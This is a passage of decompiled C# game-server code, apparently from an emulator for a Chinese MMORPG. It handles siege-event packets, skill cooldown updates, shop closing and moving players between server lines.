				byte[] array = Converter.hexStringToByte("AA553A000100400223001F0066000C33015301600007000B000000012003E02D020D0000000000000000000000000000000000E00F40000000000000000055AA");
				byte[] bytes = Encoding.Default.GetBytes(人物.帮派名字);
				System.Buffer.BlockCopy(bytes, 0, array, 34, bytes.Length);
				System.Buffer.BlockCopy(BitConverter.GetBytes(人物.人物全服ID), 0, array, 4, 2);
				if (base.Client != null)
				{
					base.Client.Send(array, array.Length);
					发送当前范围广播数据(array, array.Length);
				}
			}
			catch
			{
			}
		}

		public void 天魔神宫守城胜利结束包(Players 人物)
		{
			try
			{
				byte[] array = Converter.hexStringToByte("AA5566000B01530160000700090000000100A946000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000055AA");
				DataTable dBToDataTable = DBA.GetDBToDataTable(string.Format("select  *  from  [攻城城主]  "));
				byte[] bytes = Encoding.Default.GetBytes(dBToDataTable.Rows[0]["攻城行会名"].ToString());
				System.Buffer.BlockCopy(bytes, 0, array, 74, bytes.Length);
				System.Buffer.BlockCopy(BitConverter.GetBytes(人物.人物全服ID), 0, array, 4, 2);
				if (base.Client != null)
				{
					base.Client.Send(array, array.Length);
					发送当前范围广播数据(array, array.Length);
					dBToDataTable.Dispose();
				}
			}
			catch
			{
			}
		}

		public void 天魔神宫显示图标(Players players, int 人数)
		{
			try
			{
				if (World.jlMsg == 1)
				{
					Form1.WriteLine(0, "Players_显示攻城队员");
				}
				foreach (攻城数据 value in World.攻城数据list.Values)
				{
					using (发包类 发包类 = new 发包类())
					{
						发包类.Write2(人数);
						发包类.Write2(0);
						for (int i = 0; i < 人数; i++)
						{
							发包类.Write2(players.人物全服ID);
							发包类.Write2(0);
							if (players.帮派名字 == value.行会名字)
							{
								发包类.Write(1);
							}
							else
							{
								发包类.Write(2);
							}
							发包类.Write4(0);
							发包类.Write4(0);
							发包类.Write2(0);
							发包类.Write(0);
							发包类.Write(40);
							发包类.Write2(0);
							发包类.Write(0);
							发包类.Write4(-1);
							发包类.Write4(0);
							发包类.Write2(players.帮派Id);
							发包类.Write2(3);
							DataTable dataTable = RxjhClass.得到帮派数据(players.帮派名字);
							if (dataTable.Rows[0]["G_Master"].ToString() != players.UserName)
							{
								发包类.Write(0);
							}
							else
							{
								发包类.Write(1);
							}
							dataTable.Dispose();
						}
						if (players.Client != null)
						{
							players.Client.SendPak(发包类, 2129, base.人物全服ID);
							players.发送当前范围广播数据(发包类, 2129, base.人物全服ID);
						}
					}
				}
			}
			catch (Exception)
			{
			}
		}

		public void 天魔神宫信息(byte[] 封包数据, int 封包大小)
		{
			byte[] array = Converter.hexStringToByte("AA550E01A404CA04080107000000100000000000000000000000000000000000000003000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000010000000100000001000000010000000000000055AA");
			System.Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
			if (base.Client != null)
			{
				base.Client.Send(array, array.Length);
			}
		}

		public void 天魔神宫排行(byte[] 封包数据, int 封包大小)
		{
			foreach (攻城数据 value3 in World.攻城数据list.Values)
			{
				int year = value3.天魔攻城时间.ToUniversalTime().Year;
				int month = value3.天魔攻城时间.ToUniversalTime().Month;
				int day = value3.天魔攻城时间.ToUniversalTime().Day;
				byte[] array = Converter.hexStringToByte("AA552E00A404C20428000700000010000000000000000000000000000000000000000A3B34010000000000000000113B340155AA");
				byte[] bytes = Encoding.Default.GetBytes(value3.行会名字);
				int value = year * 1000 + month * 100 + day;
				int value2 = year * 1000 + month * 100 + (day + 2);
				System.Buffer.BlockCopy(bytes, 0, array, 18, bytes.Length);
				System.Buffer.BlockCopy(BitConverter.GetBytes(value), 0, array, 34, 4);
				System.Buffer.BlockCopy(BitConverter.GetBytes(value2), 0, array, 46, 4);
				System.Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
				if (base.Client != null)
				{
					base.Client.Send(array, array.Length);
				}
			}
		}

		public void 天魔回城(byte[] 封包数据, int 封包大小)
		{
			天魔移动(485f, 2188f, 15f, 101);
		}

		public void 更新武功冷却()
		{
			try
			{
				int num = 0;
				foreach (武功类 value in World.TBL_KONGFU.Values)
				{
					if (base.Player_Job == value.FLD_JOB || value.FLD_JOB == 0)
					{
						num++;
					}
				}
				if (num != 0)
				{
					using (发包类 发包类 = new 发包类())
					{
						发包类.Write2(1);
						发包类.Write2(1);
						发包类.Write2(num);
						foreach (武功类 value2 in World.TBL_KONGFU.Values)
						{
							if (base.Player_Job == value2.FLD_JOB || value2.FLD_JOB == 0)
							{
								发包类.Write8(value2.FLD_PID);
								发包类.Write8(0L);
								发包类.Write8(0L);
								发包类.Write8(0L);
								发包类.Write8(value2.FLD_CDTIME);
								发包类.Write8(0L);
								发包类.Write8(0L);
								发包类.Write4(0);
							}
						}
						if (base.Client != null)
						{
							base.Client.SendPak(发包类, 4610, base.人物全服ID);
						}
					}
				}
			}
			catch (Exception ex)
			{
				Form1.WriteLine(1, "更新技能冷却出错" + base.人物全服ID + "|" + ToString() + "  " + ex.Message);
			}
		}

		public void 天魔神宫邀请银币(byte[] 封包数据, int 封包大小)
		{
			SerList.Clear();
			World.conn.发送("获取服务器列表|" + base.Userid + "|" + base.原服务器序号 + "|" + base.原服务器IP + "|" + base.原服务器端口 + "|" + base.原服务器ID);
			Thread.Sleep(1100);
			if (World.是否开启共用银币市场 == 1 && base.人物坐标_地图 != 1201)
			{
				移动切换画面();
				天魔换线移动(10f, 10f, 15f, 1201);
			}
		}

		public void 天魔神宫邀请(byte[] 封包数据, int 封包大小)
		{
			DataTable dBToDataTable = DBA.GetDBToDataTable(string.Format("select  *  from  [攻城城主]  "));
			if (dBToDataTable.Rows[0]["攻城行会名"].ToString() == base.帮派名字)
			{
				World.申请攻城人物列表.Add(this);
				天魔移动(-427f, -13f, 15f, 42101);
			}
			else if (base.帮派名字 == string.Empty)
			{
				系统提示("你还没加入门派，请加入门派再来参加！", 9, "系统提示");
			}
			else
			{
				World.申请攻城人物列表.Add(this);
				天魔移动(-431f, -681f, 15f, 42101);
			}
			dBToDataTable.Dispose();
		}

		public void OpClient(int iOpCode)
		{
			byte[] array = Converter.hexStringToByte("AA5512000100BB00040001000000000000000000000055AA");
			System.Buffer.BlockCopy(Buffer.GetBytes(iOpCode), 0, array, 10, 2);
			System.Buffer.BlockCopy(Buffer.GetBytes(base.人物全服ID), 0, array, 4, 2);
			if (base.Client != null)
			{
				base.Client.Send(array, array.Length);
			}
			Thread.Sleep(100);
		}

		public void 关闭商店(int 商店ID_)
		{
			byte[] array = new byte[2];
			byte[] array2 = new byte[2];
			System.Buffer.BlockCopy(Buffer.GetBytes(商店ID_), 0, array, 0, 2);
			System.Buffer.BlockCopy(Buffer.GetBytes(2), 0, array2, 0, 2);
			byte[] array3 = Converter.hexStringToByte("AA551E0000009100100001000000010000000100000000000000000000000000000055AA");
			打开仓库中 = false;
			合成系统解锁();
			System.Buffer.BlockCopy(array, 0, array3, 18, 2);
			System.Buffer.BlockCopy(array2, 0, array3, 10, 2);
			System.Buffer.BlockCopy(array2, 0, array3, 14, 2);
			base.当前操作NPC = 0;
			if (商店ID_ == 1 || 商店ID_ == 14 || 商店ID_ == 18 || 商店ID_ == 41 || 商店ID_ == 93 || 商店ID_ == 11 || 商店ID_ == 23 || 商店ID_ == 43 || 商店ID_ == 108 || 商店ID_ == 37 || 商店ID_ == 86)
			{
				保存个人仓库存储过程();
				保存综合仓库存储过程();
			}
			System.Buffer.BlockCopy(Buffer.GetBytes(base.人物全服ID), 0, array3, 4, 2);
			if (base.Client != null)
			{
				base.Client.Send多包(array3, array3.Length);
			}
		}

		public void 天魔换线移动(float x, float y, float z, int Tomap)
		{
			try
			{
				if ((Tomap != 1201 || (!base.Player死亡 && !退出中)) && (个人商店 == null || !个人商店.个人商店是否开启) && (交易 == null || 交易.交易人 == null))
				{
					if (自动攻击 != null)
					{
						自动攻击.Enabled = false;
						自动攻击.Close();
						自动攻击.Dispose();
						自动攻击 = null;
					}
					if (自动恢复 != null)
					{
						自动恢复.Enabled = false;
						自动恢复.Close();
						自动恢复.Dispose();
						自动恢复 = null;
					}
					if (base.人物坐标_地图 == 801)
					{
						发送势力战关闭消息();
					}
					int 人物坐标_地图 = base.人物坐标_地图;
					移动离开当前地图(Tomap);
					byte[] array = Converter.hexStringToByte("AA5522000000790014000020D7C500007041000040422D01000000000000000000000000000055AA");
					base.人物坐标_X = x;
					base.人物坐标_Y = y;
					base.人物坐标_Z = z;
					base.人物坐标_地图 = Tomap;
					移动时间 = DateTime.Now;
					if (人物灵兽 != null)
					{
						人物灵兽.人物坐标_X = x;
						人物灵兽.人物坐标_Z = z;
						人物灵兽.人物坐标_Y = y;
						人物灵兽.人物坐标_MAP = Tomap;
					}
					上次坐标X = x;
					上次坐标Y = y;
					System.Buffer.BlockCopy(BitConverter.GetBytes(base.人物坐标_X), 0, array, 10, 4);
					System.Buffer.BlockCopy(BitConverter.GetBytes(base.人物坐标_Y), 0, array, 18, 4);
					System.Buffer.BlockCopy(BitConverter.GetBytes(base.人物坐标_Z), 0, array, 14, 4);
					System.Buffer.BlockCopy(Buffer.GetBytes(base.人物坐标_地图), 0, array, 22, 4);
					System.Buffer.BlockCopy(Buffer.GetBytes(base.人物全服ID), 0, array, 4, 2);
					if (base.Client != null)
					{
						base.Client.Send(array, array.Length);
					}
					if (Tomap == 101)
					{
						换线(base.原服务器ID, base.原服务器IP, base.原服务器端口);
					}
					else
					{
						换线(base.原服务器ID, base.银币广场服务器IP, base.银币广场服务器端口);
					}
					保存人物的数据();
				}
			}
			catch (Exception ex)
			{
				Form1.WriteLine(1, "换线移动      出错      [" + base.Userid + "][" + base.UserName + "]      " + ex.Message);
			}
		}

		public void 换线移动(float x, float y, float z, int Tomap)
		{
			try
			{
				if (自动攻击 != null)
				{
					自动攻击.Enabled = false;
					自动攻击.Close();
					自动攻击.Dispose();
					自动攻击 = null;
				}
				if (自动恢复 != null)
				{
					自动恢复.Enabled = false;
					自动恢复.Close();
					自动恢复.Dispose();
					自动恢复 = null;
				}
				if (base.人物坐标_地图 == 801)
				{
					发送势力战关闭消息();
				}
				int 人物坐标_地图 = base.人物坐标_地图;
				移动离开当前地图(Tomap);
				byte[] array = Converter.hexStringToByte("AA5522005C0079001C00000000000060D1C5000070410000D0412D010000000000000000000055AA");
				base.人物坐标_X = x;
				base.人物坐标_Y = y;
				base.人物坐标_Z = z;
				base.人物坐标_地图 = Tomap;
				移动时间 = DateTime.Now;
				System.Buffer.BlockCopy(BitConverter.GetBytes(base.人物坐标_X), 0, array, 14, 4);
				System.Buffer.BlockCopy(BitConverter.GetBytes(base.人物坐标_Y), 0, array, 22, 4);
				System.Buffer.BlockCopy(BitConverter.GetBytes(base.人物坐标_Z), 0, array, 18, 4);
				System.Buffer.BlockCopy(BitConverter.GetBytes(base.人物坐标_地图), 0, array, 26, 4);
				System.Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
				if (base.Client != null)
				{
					base.Client.Send(array, array.Length);
				}
				if (Tomap == 101)
				{
					换线(base.原服务器ID, base.原服务器IP, base.原服务器端口);
				}
				else
				{
					换线(base.原服务器ID, base.银币广场服务器IP, base.银币广场服务器端口);
				}
				保存人物的数据();
			}
			catch (Exception ex)
			{
				Form1.WriteLine(1, "换线移动      出错      [" + base.Userid + "][" + base.UserName + "]      " + ex.Message);
			}
		}

		public void 清空辅助状态()
		{
			try
			{
				foreach (int key in 追加状态列表.Keys)
				{
					武功类 value;
					if (World.TBL_KONGFU.TryGetValue(key, out value) && value.FLD_武功类型 == 1)
					{
						追加状态列表[key].时间结束事件();
					}
				}
			}
			catch
			{
			}
		}

		public void 换线(int 服务器ID, string IP, int port)
		{
			try
			{
				清空辅助状态();
				base.Client.在线 = false;
				int int_ = 0;
				DataTable dBToDataTable = DBA.GetDBToDataTable(string.Format("select  *  from  [TBL_XWWL_Char]  where  FLD_NAME=@Userid"), new SqlParameter[1]
				{
					SqlDBA.MakeInParam("@Userid", SqlDbType.VarChar, 30, base.UserName)
				});
				if (dBToDataTable != null)
				{
					int_ = (int)dBToDataTable.Rows[0]["FLD_INDEX"];
					dBToDataTable.Dispose();
					goto IL_00d3;
				}
				if (base.Client == null)
				{
					goto IL_00d3;
				}
				kickidlog("换线()获取人物出错");
				Form1.WriteLine(1, "获取人物出错，[" + base.Userid + "][" + base.UserName + "]");
				OpClient(1);
				base.Client.Dispose();
				goto end_IL_0000;
				IL_00d3:
				byte[] array = Converter.hexStringToByte("AA550600E7035015000055AA");
				System.Buffer.BlockCopy(BitConverter.GetBytes(base.人物全服ID), 0, array, 4, 2);
				if (base.Client != null)
				{
					base.Client.Send(array, array.Length);
				}
				byte[] array2 = Converter.hexStringToByte("AA552E00E703D20028000100000000000000000000000000000000000000000000003200000000000000000000000000000055AA");
				System.Buffer.BlockCopy(Buffer.GetBytes(服务器ID), 0, array2, 14, 4);
				System.Buffer.BlockCopy(Buffer.GetBytes(int_), 0, array2, 18, 4);
				System.Buffer.BlockCopy(Buffer.GetBytes(port), 0, array2, 30, 4);
				byte[] bytes = Encoding.Default.GetBytes(IP);
				System.Buffer.BlockCopy(bytes, 0, array2, 34, bytes.Length);
				World.conn.发送("用户换线通知|" + base.Userid + "|" + 判断是否用封包登陆);
				if (base.Client != null)
				{
					base.Client.Send(array2, array2.Length);
				}
				Logout();
				Form1.WriteLine(1, "用户换线通知|" + base.Userid + "|" + 判断是否用封包登陆);
				end_IL_0000:;
			}
			catch
			{
			}
		}
	}
}
